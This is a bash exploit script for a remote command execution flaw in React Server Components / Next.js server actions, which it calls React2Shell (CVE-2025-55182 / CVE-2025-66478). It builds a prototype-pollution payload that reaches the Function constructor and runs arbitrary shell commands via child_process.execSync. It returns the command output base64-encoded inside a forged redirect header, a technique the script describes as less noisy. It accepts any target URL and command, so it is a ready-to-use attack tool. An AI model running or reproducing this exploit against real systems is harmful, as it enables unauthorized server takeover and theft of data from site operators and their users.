#!/bin/bash
# exploit-redirect.sh - React2Shell with redirect-based stdout capture (CVE-2025-55182 / CVE-2025-66478)
#
# Uses NEXT_REDIRECT error to capture command output in x-action-redirect header.
# Returns HTTP 303 with command stdout in response header (less noisy than HTTP 500).
#
# Usage: ./exploit-redirect.sh [-q] [TARGET_URL] [COMMAND]
# Example: ./exploit-redirect.sh http://localhost:3443 "id"
#          ./exploit-redirect.sh -q http://localhost:3443 "id"  # quiet mode, only output result

set -e

# Parse flags
QUIET=0
if [[ "$1" == "-q" ]]; then
    QUIET=1
    shift
fi

TARGET="${1:-http://localhost:3443}"
COMMAND="${2:-id}"

if [[ $QUIET -eq 0 ]]; then
    echo "[*] React2Shell Exploit - redirect exfil mode"
    echo "[*] Target: ${TARGET}"
    echo "[*] Command: ${COMMAND}"
    echo ""
fi

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

# Escape single quotes in command for JavaScript string embedded in JSON
# Need \\' in JSON to get \' in JavaScript (JSON requires escaping the backslash)
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\\\\\'/g")

# Build redirect payload:
# - Execute command and base64 encode output (header-safe, preserves newlines)
# - Wrap as valid URL (http://x/DATA) so URL parsing succeeds â†’ HTTP 303
# - Create Error with digest in NEXT_REDIRECT format
# - Format: NEXT_REDIRECT;{type};{url};{statusCode};
PAYLOAD="var o=Buffer.from(process.mainModule.require('child_process').execSync('${ESCAPED_CMD}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"

# Build the JSON payload directly (avoids sed delimiter issues with special chars)
# Using printf to construct the JSON with the payload embedded
printf '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"%s","_formData":{"get":"$1:constructor:constructor"}}}' "$PAYLOAD" > "${CHUNK0}"

printf '"$@0"' > "${CHUNK1}"

# Send exploit and capture response headers
RESPONSE=$(curl -s -D - \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')

# Extract x-action-redirect header (contains our output)
REDIRECT_HEADER=$(echo "$RESPONSE" | grep -i "^x-action-redirect:" | sed 's/^[^:]*: //' | tr -d '\r')

if [[ -n "$REDIRECT_HEADER" ]]; then
    # Format is: http://x/{base64_stdout};{redirectType}
    # Extract base64 output: strip URL prefix and redirect type suffix
    B64_OUTPUT=$(echo "$REDIRECT_HEADER" | sed 's/;push$//' | sed 's/;replace$//' | sed 's|^http://x/||')
    OUTPUT=$(echo "$B64_OUTPUT" | base64 -d 2>/dev/null || echo "$B64_OUTPUT")

    if [[ $QUIET -eq 1 ]]; then
        echo -n "$OUTPUT"
    else
        echo "[+] HTTP ${HTTP_CODE} - Redirect exfil successful"
        echo "[+] Command output:"
        echo "----------------------------------------"
        echo "$OUTPUT"
        echo "----------------------------------------"
    fi
elif [[ "${HTTP_CODE}" == "303" ]]; then
    if [[ $QUIET -eq 0 ]]; then
        echo "[?] HTTP 303 but no x-action-redirect header found"
        echo "[*] Full response:"
        echo "$RESPONSE"
    fi
    exit 1
elif [[ "${HTTP_CODE}" == "500" ]]; then
    if [[ $QUIET -eq 0 ]]; then
        echo "[-] HTTP 500 - Redirect payload failed, fell through to error handler"
        echo "[*] This may indicate digest format validation failed"
        # Try to extract error message for debugging
        ERROR_MSG=$(echo "$RESPONSE" | grep -o '"message":"[^"]*"' | head -1)
        if [[ -n "$ERROR_MSG" ]]; then
            echo "[*] Error: $ERROR_MSG"
        fi
    fi
    exit 1
else
    if [[ $QUIET -eq 0 ]]; then
        echo "[-] Unexpected HTTP ${HTTP_CODE}"
        echo "$RESPONSE"
    fi
    exit 1
fi